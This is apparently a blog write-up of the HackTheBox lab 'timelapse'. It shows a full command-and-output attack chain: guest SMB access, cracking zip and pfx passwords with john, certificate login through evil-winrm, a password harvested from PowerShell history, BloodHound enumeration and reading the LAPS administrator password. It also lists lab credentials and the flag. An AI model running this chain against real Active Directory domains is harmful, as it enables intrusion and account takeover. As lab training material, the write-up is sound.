---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-07-14-timelapse-hackthebox
tags:
- hackthebox
- windows
- bloodhound
title: timelapse @ HackTheBox
---

timelapse is an easy-difficulty machine on [hackthebox.eu](https://www.hackthebox.eu). Starting off, we find that we have 'guest' access to an SMB share named 'Shares', looking inside this share we find a winrm_backup.zip, using john, we crack the password to the zip file. Opening this folder up presents a pfx file, using john again we crack it to obtain the password to it. Using openssl, we extract the key and cert which once used, gains us access to legacy's account via winrm. Root is gained by checking the powershell history, finding a password to svc_deploy. Using bloodhound, we find that this account can read the LAPS password, exploiting this vulnerability, we obtain the password to the administrator account which obtains us the root flag.

## User & Root Flag
This post is a walkthrough for timelapse, an easy machine on [hackthebox.eu](https://www.hackthebox.eu). 
The initial scan (`nmap -Pn -n -sC -sV -p- 10.129.161.13`) shows the following results:
```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-07-12 08:52:36Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2025-07-12T08:54:05+00:00; +8h00m00s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49687/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-12T08:53:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
```
## User
Enumerating SMB with `guest`, we find a share named `Shares`
```
┌──(tsunami㉿coffee)-[~]
└─$ smbmap -u 'guest' -p '' -H 10.129.161.13                                        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.161.13:445       Name: 10.129.161.13             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections 
```
![capture-0](capture-0.PNG)

Using smbclient, we can read `Shares` which eventually leads us to `winrm_backup.zip`.
```
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 20:40:06 2021
  ..                                  D        0  Mon Oct 25 20:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021

                6367231 blocks of size 4096. 1233081 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (15.5 KiloBytes/sec) (average 15.5 KiloBytes/sec)
smb: \Dev\> 

```
![capture-1](capture-1.PNG)

Downloading this with `get`, we find that the zip file is password protected.
Using john, we can crack the hash.
```
┌──(tsunami㉿coffee)-[~/Documents/timelapse]
└─$ zip2john winrm_backup.zip > zip_file_hash.txt

┌──(tsunami㉿coffee)-[~/Documents/timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-07-12 02:08) 1.020g/s 3542Kp/s 3542Kc/s 3542KC/s surkerior..superrbd
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
![capture-5](capture-5.PNG)

Once we have unlocked the zip file, the pfx file is also password protected, we can use pfx2john to crack the password again.
```
┌──(tsunami㉿coffee)-[~/Documents/timelapse]
└─$ pfx2john legacyy_dev_auth.pfx > pfx_hash.txt
                                                                                                                                           
┌──(tsunami㉿coffee)-[~/Documents/timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:48 11.10% (ETA: 02:22:06) 0g/s 36728p/s 36728c/s 36728C/s greenRING3..grapekey924
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:20 DONE (2025-07-12 02:16) 0.01242g/s 40156p/s 40156c/s 40156C/s thugways..thugers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
![capture-7](capture-7.PNG)
With the password for the pfx file obtained, we have to extract the cert and key from it.
```
┌──(tsunami㉿coffee)-[~/Documents/timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
Enter Import Password:
                                                                                                                                           
┌──(tsunami㉿coffee)-[~/Documents/timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.cert
Enter Import Password:
```
![capture-8](capture-8.PNG)
<br>
With some guessing, we can assume this file is for the `legacyy` user, however, we can find this out with `openssl x509 -in cert.pem -text -noout`
this will reveal: `othername: UPN:legacyy@timelapse.htb`

![capture-10](capture-10.PNG)

With `evil_winrm`, we can connect via SSL. (Because winrm is on port 5896 = SSL)
```
┌──(tsunami㉿coffee)-[~/Documents/timelapse]
└─$ evil-winrm -c cert.pem -k key.cert  -i 10.129.161.13 -S        
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```
![capture-11](capture-11.PNG)

## Root
Looking through the powershell history, we find a password for the `svc_deploy` account.
```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type C:\Users\legacyy\APPDATA\roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
![capture-12](capture-12.PNG)
Using bloodhound, we can see what this user can do.
```
$ bloodhound-python -c All -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d 'timelapse.htb' -ns 10.129.161.13
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: timelapse.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.timelapse.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.timelapse.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: dc01.timelapse.htb
INFO: Found 11 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc01.timelapse.htb
INFO: Querying computer: 
INFO: Done in 00M 05S
```
![capture-13](capture-13.PNG)
Reading through bloodhound, we find that svc_deploy has `ReadLAPSPassword`.<br>
[ReadLAPSPassword abuse](https://bloodhound.specterops.io/resources/edges/read-laps-password)
![capture-14](capture-14.PNG)

Connecting via winrm SSL, we can enter the following command to read the laps password.
```
$ evil-winrm -i 10.129.161.13 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'


DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-mcs-admpwd               : c%5,7g76g.sfI@FQ)1n60Px7
ms-mcs-admpwdexpirationtime : 133972158571996343
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :
```
![capture-16](capture-16.PNG)

With the administrator password, connect via winrm and read `TRX's` desktop to recieve the root flag.
```
*Evil-WinRM* PS C:\Users\TRX> cd Desktop
*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
b01be756c6da877038df527a8d1e0ca2
*Evil-WinRM* PS C:\Users\TRX\Desktop> 
```
![capture-18](capture-18.PNG)